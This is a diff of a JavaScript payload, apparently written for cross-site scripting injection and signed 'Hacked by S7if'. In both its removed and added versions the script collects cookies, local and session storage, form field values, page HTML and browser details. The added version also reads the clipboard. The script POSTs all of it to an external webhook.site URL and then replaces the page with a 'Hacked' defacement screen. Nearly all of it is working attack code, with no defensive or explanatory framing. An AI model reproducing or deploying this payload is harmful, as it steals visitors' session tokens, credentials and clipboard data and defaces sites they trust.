@@ -1,78 +1,54 @@
 <script>
 (async () => {
-  alert("💀 Hacked by S7if 💀");
-
-  const everything = {
-    cookies: document.cookie,
-    localStorage: { ...localStorage },
-    sessionStorage: { ...sessionStorage },
-    url: location.href,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    html: document.documentElement.outerHTML.slice(0, 3000),
-    forms: Array.from(document.forms).map(f => ({
-      action: f.action,
-      method: f.method,
-      fields: Array.from(f.elements).map(e => ({
-        name: e.name,
-        type: e.type,
-        value: e.value
-      }))
-    })),
-    time: new Date().toISOString()
-  };
-
-  // Send stolen data
   try {
+    alert("💀 Hacked by S7if 💀");
+
+    const everything = {
+      cookies: document.cookie,
+      localStorage: { ...localStorage },
+      sessionStorage: { ...sessionStorage },
+      url: location.href,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      clipboard: "N/A",
+      html: document.documentElement.outerHTML.slice(0, 3000),
+      forms: Array.from(document.forms).map(f => ({
+        action: f.action,
+        method: f.method,
+        fields: Array.from(f.elements).map(e => ({
+          name: e.name,
+          type: e.type,
+          value: e.value
+        }))
+      })),
+      time: new Date().toISOString()
+    };
+
+    try {
+      everything.clipboard = await navigator.clipboard.readText();
+    } catch (err) {
+      everything.clipboard = "Clipboard access denied";
+      console.warn("Clipboard error:", err);
+    }
+
     await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(everything)
     });
-  } catch (e) {}
 
-  // Replace page with scary effect
-  document.head.innerHTML = `
-    <style>
-      @keyframes shake {
-        0% { transform: translate(1px, 1px) rotate(0deg); }
-        10% { transform: translate(-1px, -2px) rotate(-1deg); }
-        20% { transform: translate(-3px, 0px) rotate(1deg); }
-        30% { transform: translate(3px, 2px) rotate(0deg); }
-        40% { transform: translate(1px, -1px) rotate(1deg); }
-        50% { transform: translate(-1px, 2px) rotate(-1deg); }
-        60% { transform: translate(-3px, 1px) rotate(0deg); }
-        70% { transform: translate(3px, 1px) rotate(-1deg); }
-        80% { transform: translate(-1px, -1px) rotate(1deg); }
-        90% { transform: translate(1px, 2px) rotate(0deg); }
-        100% { transform: translate(1px, -2px) rotate(-1deg); }
-      }
+    document.body.innerHTML = `
+      <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;background:#000;color:#0f0;font-size:2em;font-family:monospace;text-align:center;">
+        <div style="font-size: 0.8em; color: #f00; margin-bottom: 20px;">👑 Saif 👑</div>
+        <div>👾 Hacked by S7if 👾</div>
+        <div style="font-size: 0.6em; margin-top: 20px;">Your session has been terminated.</div>
+      </div>
+    `;
 
-      body {
-        animation: shake 0.3s infinite;
-        background: black;
-        color: red;
-        font-size: 2em;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        height: 100vh;
-        font-family: monospace;
-        text-shadow: 0 0 5px red, 0 0 10px red;
-      }
-    </style>
-  `;
-
-  document.body.innerHTML = `
-    <div>👁 YOU'VE BEEN WATCHED 👁</div>
-    <div style="font-size: 0.5em; margin-top: 20px;">All your data has been extracted...</div>
-  `;
-
-  // Add scary sound
-  const audio = new Audio("https://cdn.pixabay.com/audio/2022/03/15/audio_a343c7b55f.mp3");
-  audio.play().catch(() => {});
-
+  } catch (err) {
+    console.error("🔥 Critical Error:", err);
+    alert("🔥 Error occurred while stealing data");
+  }
 })();
 </script>
